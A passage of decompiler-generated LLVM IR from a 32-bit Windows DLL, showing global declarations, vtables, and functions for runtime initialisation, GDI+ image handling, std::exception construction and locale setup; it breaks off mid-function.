@global_var_10040a94 = local_unnamed_addr global i32 0
@global_var_10032306 = local_unnamed_addr constant i32 0
@global_var_1003ac28 = constant i32 -2
@global_var_1003ecd0 = local_unnamed_addr global i32 0
@global_var_1003ecd4 = local_unnamed_addr global i32 0
@global_var_1003eccc = local_unnamed_addr global i32 0
@global_var_1003ecd8 = global i32 0
@global_var_1003d580 = global i32 0
@global_var_1003d688 = global i32 0
@global_var_1003d9a7 = global i32 64456704
@global_var_1003ac08 = constant i32 -2
@global_var_1003d9a9 = global i32 1049559
@global_var_1003e8dc = local_unnamed_addr global i32 0
@global_var_100308b8 = constant i32 1410065408
@global_var_10031254 = constant i32 487260709
@global_var_100331dc = constant [6 x i8] c"1#IND\00"
@global_var_100331d4 = constant [7 x i8] c"1#SNAN\00"
@global_var_100331cc = constant [7 x i8] c"1#QNAN\00"
@global_var_100331c4 = constant [6 x i8] c"1#INF\00"
@global_var_1003ed10 = local_unnamed_addr global i32 0
@global_var_10037820 = local_unnamed_addr constant [6 x i8] c"log10\00"
@global_var_1003a000 = local_unnamed_addr constant i32 429065506
@global_var_1003a02c = local_unnamed_addr constant i32 429065506
@global_var_1003a060 = local_unnamed_addr constant i32 429065506
@global_var_1003ded0 = local_unnamed_addr global i32 0
@global_var_1003dfa0 = local_unnamed_addr global i32 0
@global_var_1003dff0 = local_unnamed_addr global i32 0
@global_var_1003df98 = local_unnamed_addr global i32 0
@global_var_1003e084 = local_unnamed_addr global i32 0
@global_var_1003e07c = local_unnamed_addr global i32 0
@global_var_1003e109 = local_unnamed_addr global i32 0
@global_var_1003e108 = local_unnamed_addr global i32 0
@global_var_1003d068 = local_unnamed_addr global i32 10
@4 = external global i32
@global_var_10038c04 = external constant i8*
@global_var_10038ed0 = external local_unnamed_addr constant i128
@global_var_10038f70 = external local_unnamed_addr constant i128
@global_var_1003fd30 = global i16* null
@global_var_10038f80 = external local_unnamed_addr constant i128
@global_var_1003f530 = global i16* null
@global_var_10040048 = global i16* null
@global_var_1003ff38 = global i16 0
@global_var_1003ff44 = local_unnamed_addr global i16 0
@global_var_1003ff42 = local_unnamed_addr global i16 0
@global_var_1003ff40 = local_unnamed_addr global i16 0
@global_var_1003ff3e = local_unnamed_addr global i16 0
@global_var_1003ff3a = local_unnamed_addr global i16 0
@global_var_1003ed28 = global i16* null
@global_var_10038d40 = external local_unnamed_addr constant i128
@global_var_10038d60 = external local_unnamed_addr constant i128
@global_var_10038d70 = external local_unnamed_addr constant i128
@global_var_10038d50 = external local_unnamed_addr constant i128
@global_var_10038d80 = external local_unnamed_addr constant i128
@global_var_10038f10 = external local_unnamed_addr constant i128
@global_var_10038f30 = external local_unnamed_addr constant i128
@global_var_10038e60 = external local_unnamed_addr constant i128
@global_var_10040a80 = global void ()* null
@global_var_1004099c = global i32** null
@5 = internal constant [2 x i8] c"\0A\00"
@6 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @5, i32 0, i32 0)
@global_var_10038db0 = external local_unnamed_addr constant i128
@global_var_10038e20 = external local_unnamed_addr constant i128
@global_var_1003d9f0 = local_unnamed_addr global i64 8030875174627502319
@global_var_10038560 = constant i16* inttoptr (i32 87 to i16*)
@global_var_10038564 = constant i16* inttoptr (i32 80 to i16*)
@global_var_10038fe0 = external local_unnamed_addr constant i128
@global_var_10038df0 = external local_unnamed_addr constant i128
@global_var_10038ec0 = external local_unnamed_addr constant i128
@global_var_10038e00 = external local_unnamed_addr constant i128
@global_var_10038e30 = external local_unnamed_addr constant i128
@global_var_10038dd0 = external local_unnamed_addr constant i128
@global_var_10040970 = global i16* null
@7 = internal constant [14 x i8] c"MWuFQPJLM\7FqVM\00"
@global_var_10038a70 = constant i8* getelementptr inbounds ([14 x i8], [14 x i8]* @7, i32 0, i32 0)
@global_var_10038eb0 = external local_unnamed_addr constant i128
@global_var_10038fd0 = external local_unnamed_addr constant i128
@global_var_10038fb0 = external local_unnamed_addr constant i128
@global_var_10038634 = local_unnamed_addr constant i8 0
@global_var_1003863c = local_unnamed_addr constant i16 38
@global_var_10038640 = local_unnamed_addr constant i16 61
@global_var_10038dc0 = external local_unnamed_addr constant i128
@global_var_10038ef0 = external local_unnamed_addr constant i128
@global_var_10038f90 = external local_unnamed_addr constant i128
@global_var_10038ee0 = external local_unnamed_addr constant i128
@global_var_10038fc0 = external local_unnamed_addr constant i128
@global_var_10038e40 = external local_unnamed_addr constant i128
@global_var_10038f60 = external local_unnamed_addr constant i128
@global_var_10038e80 = external local_unnamed_addr constant i128
@global_var_10038e90 = external local_unnamed_addr constant i128
@global_var_10038f50 = external local_unnamed_addr constant i128
@global_var_10038ea0 = external local_unnamed_addr constant i128
@global_var_10038fa0 = external local_unnamed_addr constant i128
@global_var_10038e10 = external local_unnamed_addr constant i128
@global_var_10038e70 = external local_unnamed_addr constant i128
@global_var_10038f40 = external local_unnamed_addr constant i128
@global_var_10038f00 = external local_unnamed_addr constant i128
@global_var_10038e50 = external local_unnamed_addr constant i128
@global_var_10038de0 = external local_unnamed_addr constant i128
@global_var_10038f20 = external local_unnamed_addr constant i128
@global_var_10038d90 = external local_unnamed_addr constant i128
@global_var_10038a34 = local_unnamed_addr constant i8 0
@global_var_10038a44 = local_unnamed_addr constant i8 0
@global_var_10038a4c = local_unnamed_addr constant i8 0
@global_var_1003e228 = global %_RTL_CRITICAL_SECTION* null
@global_var_1003e58c = local_unnamed_addr global i8 0
@global_var_1003e5bc = global i16* null
@global_var_1002f724 = constant %_RTL_CRITICAL_SECTION* inttoptr (i32 1 to %_RTL_CRITICAL_SECTION*)
@global_var_1003e668 = local_unnamed_addr global i8 0
@global_var_1003d1f0 = external global i8*
@global_var_1003d3f4 = local_unnamed_addr global i8 -2
@global_var_10032280 = local_unnamed_addr constant x86_fp80 0xK7FFF8000000000000000
@global_var_10031284 = local_unnamed_addr constant double 5.000000e-01
@global_var_1003ed00 = external local_unnamed_addr global i8*
@global_var_1003e7c8 = external global i8*
@global_var_1003ecf8 = external local_unnamed_addr global i8*
@global_var_1003e8d0 = local_unnamed_addr global i8** null
@global_var_1003e948 = external global i8*
@8 = internal constant [2 x i8] c"\04\00"
@global_var_100318c4 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @8, i32 0, i32 0)
@9 = internal constant [2 x i8] c"\04\00"
@global_var_100318bc = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @9, i32 0, i32 0)
@10 = internal constant [2 x i8] c"\04\00"
@global_var_100318f0 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @10, i32 0, i32 0)
@global_var_100318e8 = constant %_RTL_CRITICAL_SECTION* inttoptr (i32 8 to %_RTL_CRITICAL_SECTION*)
@11 = internal constant [2 x i8] c"\05\00"
@global_var_10031914 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @11, i32 0, i32 0)
@global_var_1003d3f0 = global i16* inttoptr (i32 67 to i16*)
@global_var_10031b08 = constant i16* inttoptr (i32 67 to i16*)
@global_var_10031324 = local_unnamed_addr constant i64 38654705667
@global_var_10031328 = local_unnamed_addr constant i64 9
@global_var_100321d0 = external local_unnamed_addr constant i128
@global_var_100321e0 = external local_unnamed_addr constant i128
@global_var_10033f98 = constant i64* null
@global_var_100343b0 = constant i128* null
@global_var_10032228 = local_unnamed_addr constant i64 -134217728
@global_var_10034bc0 = constant i64* null
@global_var_10034fd0 = constant i128* null
@global_var_10032230 = local_unnamed_addr constant i64 -4614195897457180672
@global_var_100357e0 = constant i64* inttoptr (i32 1073741824 to i64*)
@global_var_10035ff0 = constant i128* null
@global_var_10037000 = external local_unnamed_addr constant i128
@global_var_10037010 = external local_unnamed_addr constant i128
@global_var_100321c0 = local_unnamed_addr constant i64 4843621399236968448
@global_var_10037020 = constant i128* null
@global_var_10032200 = external local_unnamed_addr constant i128
@global_var_10032220 = local_unnamed_addr constant i64 4604418534313441775
@global_var_10032210 = external local_unnamed_addr constant i128
@global_var_100321f0 = external local_unnamed_addr constant i128
@global_var_10032250 = local_unnamed_addr constant double -0.000000e+00
@global_var_10032248 = local_unnamed_addr constant double 0xFFF0000000000000
@global_var_10032238 = local_unnamed_addr constant i64 9218868437227405313
@global_var_10032270 = local_unnamed_addr constant i64 -2251799813685248
@global_var_10032240 = local_unnamed_addr constant double 0x7FF0000000000000
@global_var_10032268 = local_unnamed_addr constant i64 4503599627370496
@global_var_10032258 = local_unnamed_addr constant i64 -9007199254740992
@global_var_10032260 = local_unnamed_addr constant i64 9214364837600034816
@global_var_1003228a = local_unnamed_addr constant x86_fp80 0xKFFFF8000000000000000
@global_var_1003229e = local_unnamed_addr constant x86_fp80 0xK400DFFFF000000000000
@global_var_100322b2 = local_unnamed_addr constant double 5.000000e-01
@global_var_100322fe = local_unnamed_addr constant double 1.000000e+00
@global_var_100322f4 = local_unnamed_addr constant x86_fp80 0xK3FFEC90FD7E45803CD14
@global_var_1003ece8 = local_unnamed_addr global i8 0
@12 = internal constant [2 x i8] c"0\00"
@global_var_100331c0 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @12, i32 0, i32 0)
@global_var_100311be = external constant i8*
@global_var_100311bf = external constant i8*
@global_var_100311bc = constant i16* inttoptr (i32 20633 to i16*)
@global_var_10037890 = external local_unnamed_addr constant i128
@global_var_100378a0 = external local_unnamed_addr constant i128
@global_var_10037900 = external local_unnamed_addr constant i128
@global_var_100378b0 = external local_unnamed_addr constant i128
@global_var_100378c0 = external local_unnamed_addr constant i128
@global_var_10037da0 = constant i128* null
@global_var_10037990 = constant i128* null
@global_var_10037950 = external local_unnamed_addr constant i128
@global_var_10037960 = external local_unnamed_addr constant i128
@global_var_10037970 = external local_unnamed_addr constant i128
@global_var_100378d0 = external local_unnamed_addr constant i128
@global_var_100378e0 = constant i128* null
@global_var_10037980 = external local_unnamed_addr constant i128
@global_var_10037910 = external local_unnamed_addr constant i128
@global_var_10037938 = local_unnamed_addr constant double 0x7FF0000000000000
@global_var_10037930 = local_unnamed_addr constant i64 -4503599627370496
@global_var_10037920 = local_unnamed_addr constant i64 4841369599423283200
@global_var_1002c3b4 = constant %vtable_1002c3b4_type { i32 (i8)* @function_10001260, i32 ()* @function_10001250 }
@global_var_1002c3cc = constant %vtable_1002c3cc_type { i32 (i8)* @function_10001260, i32 ()* @function_10001250 }
@global_var_1002c434 = constant %vtable_1002c434_type { i32 (i8)* @function_10001bc0, i32 ()* @function_10001250 }
@global_var_1002c44c = constant %vtable_1002c44c_type { i32 (i8)* @function_100018a0, i32 ()* @function_10001d30, i32 (i32, i32)* @function_10001d40, i32 (i32, i32)* @function_10001900, i32 (i32, i32)* @function_10001960, i32 (i32, i32)* @function_10001920 }
@vtable_1002c474 = local_unnamed_addr global %vtable_1002c474_type { i32 (i32)* @"??_Gios_base@std@@UAEPAXI@Z" }
@vtable_1002c4bc = local_unnamed_addr global %vtable_1002c4bc_type { i32 (i32)* @"??_G?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEPAXI@Z", i32 ()* @"?_Lock@?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEXXZ", i32 ()* @"?_Lock@?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEXXZ.3", i32 ()* @function_1000d00b, i32 (i32)* @"?pbackfail@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHH@Z", i32 ()* @function_1000d45a, i32 ()* @"?underflow@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ", i32 ()* @function_1000d497, i32 (i32, i32, i32)* @function_1000d6b2, i32 (i32, i32, i32)* @function_1000d7a0, i32 (i64, i32, i32)* @"?seekoff@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAE?AV?$fpos@U_Mbstatet@@@2@_JHH@Z", i32 (i32, i32)* @"?seekpos@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAE?AV?$fpos@U_Mbstatet@@@2@V32@H@Z", i32 (i8*, i64)* @"?setbuf@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@PAD_J@Z", i32 ()* @"?sync@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ", i32 (i32*)* @"?imbue@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEXABVlocale@2@@Z" }
@vtable_1002c4fc = local_unnamed_addr global %vtable_1002c4fc_type { i32 (i32)* @"??_G?$basic_ios@DU?$char_traits@D@std@@@std@@UAEPAXI@Z" }
@vtable_1002c504 = local_unnamed_addr global %vtable_1002c504_type { i32 (i32)* @function_1000ca51 }
@vtable_1002c558 = local_unnamed_addr global %vtable_1002c558_type { i32 (i32)* @"??_G__non_rtti_object@std@@UAEPAXI@Z", i32 ()* @function_10001250 }
@vtable_1002c574 = local_unnamed_addr global %vtable_1002c574_type { i32 (i32)* @"??_G__non_rtti_object@std@@UAEPAXI@Z", i32 ()* @function_10001250 }
@vtable_1002c58c = local_unnamed_addr global %vtable_1002c58c_type { i32 (i32)* @"??_G__non_rtti_object@std@@UAEPAXI@Z", i32 ()* @function_10001250 }
@vtable_1002f5e0 = local_unnamed_addr global %vtable_1002f5e0_type { i32 (i32)* @"??_G_Ref_count_base@std@@UAEPAXI@Z" }
@vtable_1002f5ec = local_unnamed_addr global %vtable_1002f5ec_type { i32 (i32)* @"??_G__non_rtti_object@std@@UAEPAXI@Z", i32 ()* @function_10001250 }
@global_var_10038ca4 = constant %vtable_10038ca4_type { i32 (i32)* @function_10001150, i32 ()* @function_10001190 }
@global_var_10038528 = constant [2 x i8] c"\0A\00"

define i32 @function_10001000() local_unnamed_addr {
dec_label_pc_10001000:
  %0 = call i32 @function_10004cf0(), !insn.addr !0
  store i32 0, i32* @global_var_10040a5c, align 4, !insn.addr !1
  store i32 15, i32* @global_var_10040a60, align 4, !insn.addr !2
  store i8 0, i8* bitcast (i32* @global_var_10040a4c to i8*), align 4, !insn.addr !3
  %1 = call i32 @_atexit(void ()* inttoptr (i32 268612080 to void ()*)), !insn.addr !4
  ret i32 %1, !insn.addr !5
}

define i32 @function_100010a0() local_unnamed_addr {
dec_label_pc_100010a0:
  %0 = call i32 @"??0_Init_cout@std@@QAE@XZ"(), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i32 @function_100010c0(void ()* %func) local_unnamed_addr {
dec_label_pc_100010c0:
  %0 = call i32 @_atexit(void ()* %func), !insn.addr !7
  ret i32 %0, !insn.addr !8
}

define i32 @function_100010cc(void ()* %func) local_unnamed_addr {
dec_label_pc_100010cc:
  %0 = call i32 @_atexit(void ()* %func), !insn.addr !9
  ret i32 %0, !insn.addr !10
}

define i32 @function_100010d8(void ()* %func) local_unnamed_addr {
dec_label_pc_100010d8:
  %0 = call i32 @_atexit(void ()* %func), !insn.addr !11
  ret i32 %0, !insn.addr !12
}

define i32 @function_10001100(void ()* %func) local_unnamed_addr {
dec_label_pc_10001100:
  %0 = call i32 @_atexit(void ()* %func), !insn.addr !13
  ret i32 %0, !insn.addr !14
}

define i32 @function_10001110() local_unnamed_addr {
dec_label_pc_10001110:
  ret i32 ptrtoint (i32* @global_var_10040a68 to i32), !insn.addr !15
}

define i32 @function_10001120(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001120:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @___acrt_iob_func(i32 1, i32 %0, i32 %1), !insn.addr !16
  %3 = call i32 @function_10001110(), !insn.addr !17
  %4 = add i32 %3, 4, !insn.addr !18
  %5 = inttoptr i32 %4 to i32*, !insn.addr !18
  %6 = load i32, i32* %5, align 4, !insn.addr !18
  %7 = inttoptr i32 %3 to i32*, !insn.addr !19
  %8 = load i32, i32* %7, align 4, !insn.addr !19
  %9 = call i32 @___stdio_common_vfprintf(i32 %8, i32 %6), !insn.addr !20
  ret i32 %9, !insn.addr !21
}

define i32 @function_10001150(i32 %arg1) {
dec_label_pc_10001150:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !22
  %2 = inttoptr i32 %1 to i32*, !insn.addr !22
  %3 = load i32, i32* %2, align 4, !insn.addr !22
  %4 = inttoptr i32 %0 to i32*, !insn.addr !23
  store i32 ptrtoint (i32* @global_var_10038cb0 to i32), i32* %4, align 4, !insn.addr !23
  %5 = inttoptr i32 %3 to i32*, !insn.addr !24
  %6 = call i32 @GdipDisposeImage(i32* %5), !insn.addr !24
  %7 = and i32 %arg1, 1
  %8 = icmp eq i32 %7, 0, !insn.addr !25
  br i1 %8, label %dec_label_pc_10001189, label %dec_label_pc_1000116c, !insn.addr !26

dec_label_pc_1000116c:                            ; preds = %dec_label_pc_10001150
  %9 = and i32 %arg1, 4
  %10 = icmp eq i32 %9, 0, !insn.addr !27
  %11 = icmp eq i1 %10, false, !insn.addr !28
  br i1 %11, label %dec_label_pc_1000117e, label %dec_label_pc_10001170, !insn.addr !28

dec_label_pc_10001170:                            ; preds = %dec_label_pc_1000116c
  call void @GdipFree(i32* %4), !insn.addr !29
  ret i32 %0, !insn.addr !30

dec_label_pc_1000117e:                            ; preds = %dec_label_pc_1000116c
  %12 = call i32 @function_100040e0(), !insn.addr !31
  br label %dec_label_pc_10001189, !insn.addr !32

dec_label_pc_10001189:                            ; preds = %dec_label_pc_1000117e, %dec_label_pc_10001150
  ret i32 %0, !insn.addr !33
}

define i32 @function_10001190() {
dec_label_pc_10001190:
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !34
  %1 = bitcast i32* %stack_var_-8 to i32**
  %2 = add i32 %0, 4, !insn.addr !35
  %3 = inttoptr i32 %2 to i32*, !insn.addr !35
  %4 = load i32, i32* %3, align 4, !insn.addr !35
  %5 = inttoptr i32 %4 to i32*, !insn.addr !36
  %6 = call i32 @GdipCloneImage(i32* %5, i32** nonnull %1), !insn.addr !36
  %7 = icmp eq i32 %6, 0, !insn.addr !37
  br i1 %7, label %dec_label_pc_100011b2, label %dec_label_pc_100011af, !insn.addr !38

dec_label_pc_100011af:                            ; preds = %dec_label_pc_10001190
  %8 = add i32 %0, 8, !insn.addr !39
  %9 = inttoptr i32 %8 to i32*, !insn.addr !39
  store i32 %6, i32* %9, align 4, !insn.addr !39
  br label %dec_label_pc_100011b2, !insn.addr !39

dec_label_pc_100011b2:                            ; preds = %dec_label_pc_100011af, %dec_label_pc_10001190
  %10 = call i32* @GdipAlloc(i32 16), !insn.addr !40
  %11 = icmp eq i32* %10, null, !insn.addr !41
  br i1 %11, label %dec_label_pc_100011d5, label %dec_label_pc_100011be, !insn.addr !42

dec_label_pc_100011be:                            ; preds = %dec_label_pc_100011b2
  %12 = ptrtoint i32* %10 to i32, !insn.addr !40
  %13 = add i32 %0, 8, !insn.addr !43
  %14 = inttoptr i32 %13 to i32*, !insn.addr !43
  %15 = load i32, i32* %14, align 4, !insn.addr !43
  %16 = load i32, i32* %stack_var_-8, align 4, !insn.addr !44
  store i32 ptrtoint (i32* @global_var_10038cb0 to i32), i32* %10, align 4, !insn.addr !45
  %17 = add i32 %12, 4, !insn.addr !46
  %18 = inttoptr i32 %17 to i32*, !insn.addr !46
  store i32 %16, i32* %18, align 4, !insn.addr !46
  %19 = add i32 %12, 8, !insn.addr !47
  %20 = inttoptr i32 %19 to i32*, !insn.addr !47
  store i32 %15, i32* %20, align 4, !insn.addr !47
  ret i32 %12, !insn.addr !48

dec_label_pc_100011d5:                            ; preds = %dec_label_pc_100011b2
  ret i32 0, !insn.addr !49
}

define i32 @"??0exception@std@@QAE@QBD@Z"(i32* %result, i8* %arg2) local_unnamed_addr {
dec_label_pc_100011e0:
  %0 = call i128 @__decompiler_undefined_function_3()
  %1 = ptrtoint i32* %result to i32
  %2 = call i128 @__asm_xorps(i128 %0, i128 %0), !insn.addr !50
  %3 = add i32 %1, 4, !insn.addr !51
  store i32 ptrtoint (%vtable_1002c3b4_type* @global_var_1002c3b4 to i32), i32* %result, align 4, !insn.addr !52
  %4 = inttoptr i32 %3 to i64*, !insn.addr !53
  %5 = load i64, i64* %4, align 4, !insn.addr !53
  call void @__asm_movq.32(i64 %5, i128 %2), !insn.addr !53
  %6 = call i32 @___std_exception_copy(), !insn.addr !54
  ret i32 %1, !insn.addr !55
}

define i32 @"??0exception@std@@QAE@ABV01@@Z"(i32* %result, i32* %arg2) local_unnamed_addr {
dec_label_pc_10001220:
  %0 = call i128 @__decompiler_undefined_function_3()
  %1 = ptrtoint i32* %result to i32
  %2 = call i128 @__asm_xorps(i128 %0, i128 %0), !insn.addr !56
  %3 = add i32 %1, 4, !insn.addr !57
  store i32 ptrtoint (%vtable_1002c3b4_type* @global_var_1002c3b4 to i32), i32* %result, align 4, !insn.addr !58
  %4 = inttoptr i32 %3 to i64*, !insn.addr !59
  %5 = load i64, i64* %4, align 4, !insn.addr !59
  call void @__asm_movq.32(i64 %5, i128 %2), !insn.addr !59
  %6 = call i32 @___std_exception_copy(), !insn.addr !60
  ret i32 %1, !insn.addr !61
}

define i32 @function_10001250() {
dec_label_pc_10001250:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !62
  %2 = inttoptr i32 %1 to i32*, !insn.addr !62
  %3 = load i32, i32* %2, align 4, !insn.addr !62
  %4 = icmp eq i32 %3, 0, !insn.addr !63
  %5 = icmp eq i1 %4, false, !insn.addr !64
  %6 = select i1 %5, i32 %3, i32 ptrtoint ([18 x i8]* @global_var_10038bd4 to i32), !insn.addr !64
  ret i32 %6, !insn.addr !65
}

define i32 @function_10001260(i8 %arg1) {
dec_label_pc_10001260:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = add i32 %2, 4, !insn.addr !66
  %4 = inttoptr i32 %2 to i32*, !insn.addr !67
  store i32 ptrtoint (%vtable_1002c3b4_type* @global_var_1002c3b4 to i32), i32* %4, align 4, !insn.addr !67
  %5 = call i32 @___std_exception_destroy(i32 %3, i32 %0, i32 %1), !insn.addr !68
  %6 = and i8 %arg1, 1, !insn.addr !69
  %7 = icmp eq i8 %6, 0, !insn.addr !69
  br i1 %7, label %dec_label_pc_10001289, label %dec_label_pc_1000127e, !insn.addr !70

dec_label_pc_1000127e:                            ; preds = %dec_label_pc_10001260
  call void @"??3@YAXPAXI@Z"(i32* %4, i32 ptrtoint (i32* @4 to i32)), !insn.addr !71
  br label %dec_label_pc_10001289, !insn.addr !72

dec_label_pc_10001289:                            ; preds = %dec_label_pc_1000127e, %dec_label_pc_10001260
  ret i32 %2, !insn.addr !73
}

define i32 @function_10001290(i8* %arg1) local_unnamed_addr {
dec_label_pc_10001290:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_3()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !74
  %3 = add i32 %0, 4, !insn.addr !75
  %4 = inttoptr i32 %0 to i32*, !insn.addr !76
  store i32 ptrtoint (%vtable_1002c3b4_type* @global_var_1002c3b4 to i32), i32* %4, align 4, !insn.addr !76
  %5 = inttoptr i32 %3 to i64*, !insn.addr !77
  %6 = load i64, i64* %5, align 4, !insn.addr !77
  call void @__asm_movq.32(i64 %6, i128 %2), !insn.addr !77
  %7 = call i32 @___std_exception_copy(), !insn.addr !78
  store i32 ptrtoint (i32* @global_var_1002c3c0 to i32), i32* %4, align 4, !insn.addr !79
  ret i32 %0, !insn.addr !80
}

define i32 @"??0bad_cast@std@@QAE@XZ"() local_unnamed_addr {
dec_label_pc_100012f0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_3()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !81
  %3 = add i32 %0, 4, !insn.addr !82
  %4 = inttoptr i32 %3 to i64*, !insn.addr !82
  %5 = load i64, i64* %4, align 4, !insn.addr !82
  call void @__asm_movq.32(i64 %5, i128 %2), !insn.addr !82
  %6 = inttoptr i32 %3 to i32*, !insn.addr !83
  store i32 ptrtoint ([9 x i8]* @global_var_10038be8 to i32), i32* %6, align 4, !insn.addr !83
  %7 = inttoptr i32 %0 to i32*, !insn.addr !84
  store i32 ptrtoint (%vtable_1002c3cc_type* @global_var_1002c3cc to i32), i32* %7, align 4, !insn.addr !84
  ret i32 %0, !insn.addr !85
}

define i32 @"??0_Locinfo@std@@QAE@PBD@Z"(i32* %result, i8* %arg2) local_unnamed_addr {
dec_label_pc_10001310:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !86
  %eax.0.reg2mem = alloca i32, !insn.addr !86
  %0 = ptrtoint i8* %arg2 to i32
  %1 = ptrtoint i32* %result to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !87
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !88
  %3 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !89
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !90
  store i32 0, i32* %stack_var_-44, align 4, !insn.addr !91
  %4 = call i32 @"??0_Lockit@std@@QAE@H@Z"(i32 %1), !insn.addr !92
  %5 = add i32 %1, 4, !insn.addr !93
  %6 = inttoptr i32 %5 to i32*, !insn.addr !93
  store i32 0, i32* %6, align 4, !insn.addr !93
  %7 = add i32 %1, 8, !insn.addr !94
  %8 = inttoptr i32 %7 to i8*, !insn.addr !94
  store i8 0, i8* %8, align 1, !insn.addr !94
  %9 = add i32 %1, 12, !insn.addr !95
  %10 = inttoptr i32 %9 to i32*, !insn.addr !95
  store i32 0, i32* %10, align 4, !insn.addr !95
  %11 = add i32 %1, 16, !insn.addr !96
  %12 = inttoptr i32 %11 to i8*, !insn.addr !96
  store i8 0, i8* %12, align 1, !insn.addr !96
  %13 = add i32 %1, 20, !insn.addr !97
  %14 = inttoptr i32 %13 to i32*, !insn.addr !97
  store i32 0, i32* %14, align 4, !insn.addr !97
  %15 = add i32 %1, 24, !insn.addr !98
  %16 = inttoptr i32 %15 to i16*, !insn.addr !98
  store i16 0, i16* %16, align 2, !insn.addr !98
  %17 = add i32 %1, 28, !insn.addr !99
  %18 = inttoptr i32 %17 to i32*, !insn.addr !99
  store i32 0, i32* %18, align 4, !insn.addr !99
  %19 = add i32 %1, 32, !insn.addr !100
  %20 = inttoptr i32 %19 to i16*, !insn.addr !100
  store i16 0, i16* %20, align 2, !insn.addr !100
  %21 = add i32 %1, 36, !insn.addr !101
  %22 = inttoptr i32 %21 to i32*, !insn.addr !101
  store i32 0, i32* %22, align 4, !insn.addr !101
  %23 = add i32 %1, 40, !insn.addr !102
  %24 = inttoptr i32 %23 to i8*, !insn.addr !102
  store i8 0, i8* %24, align 1, !insn.addr !102
  %25 = add i32 %1, 44, !insn.addr !103
  %26 = inttoptr i32 %25 to i32*, !insn.addr !103
  store i32 0, i32* %26, align 4, !insn.addr !103
  %27 = add i32 %1, 48, !insn.addr !104
  %28 = inttoptr i32 %27 to i8*, !insn.addr !104
  store i8 0, i8* %28, align 1, !insn.addr !104
  %29 = icmp eq i8* %arg2, null, !insn.addr !105
  %30 = icmp eq i1 %29, false, !insn.addr !106
  store i32 %0, i32* %eax.0.reg2mem, !insn.addr !106
  store i32* %stack_var_-44, i32** %esp.0.in.reg2mem, !insn.addr !106
  br i1 %30, label %dec_label_pc_100013a5, label %dec_label_pc_1000138a, !insn.addr !106

dec_label_pc_1000138a:                            ; preds = %dec_label_pc_10001310
  %31 = call i32 @function_10001290(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10038bf4, i32 0, i32 0)), !insn.addr !107
  %32 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !108
  store i32 %32, i32* %stack_var_-56, align 4, !insn.addr !108
  %33 = call i32 @"__CxxThrowException@8"(), !insn.addr !109
  store i32 %33, i32* %eax.0.reg2mem, !insn.addr !109
  store i32* %stack_var_-56, i32** %esp.0.in.reg2mem, !insn.addr !109
  br label %dec_label_pc_100013a5, !insn.addr !109

dec_label_pc_100013a5:                            ; preds = %dec_label_pc_1000138a, %dec_label_pc_10001310
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %34 = add i32 %esp.0, -4, !insn.addr !110
  %35 = inttoptr i32 %34 to i32*, !insn.addr !110
  store i32 %eax.0.reload, i32* %35, align 4, !insn.addr !110
  %36 = add i32 %esp.0, -8, !insn.addr !111
  %37 = inttoptr i32 %36 to i32*, !insn.addr !111
  store i32 %1, i32* %37, align 4, !insn.addr !111
  %38 = call i32 @"?_Locinfo_ctor@_Locinfo@std@@SAXPAV12@PBD@Z"(i32* nonnull @4, i8* bitcast (i32* @4 to i8*)), !insn.addr !112
  %39 = load i32, i32* %stack_var_-16, align 4, !insn.addr !113
  call void @__writefsdword(i32 0, i32 %39), !insn.addr !114
  ret i32 %1, !insn.addr !115
}

define i32 @"??1_Locinfo@std@@QAE@XZ"() local_unnamed_addr {
dec_label_pc_100013d0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !116
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !117
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !118
  %3 = load i32, i32* @global_var_1003d084, align 4, !insn.addr !119
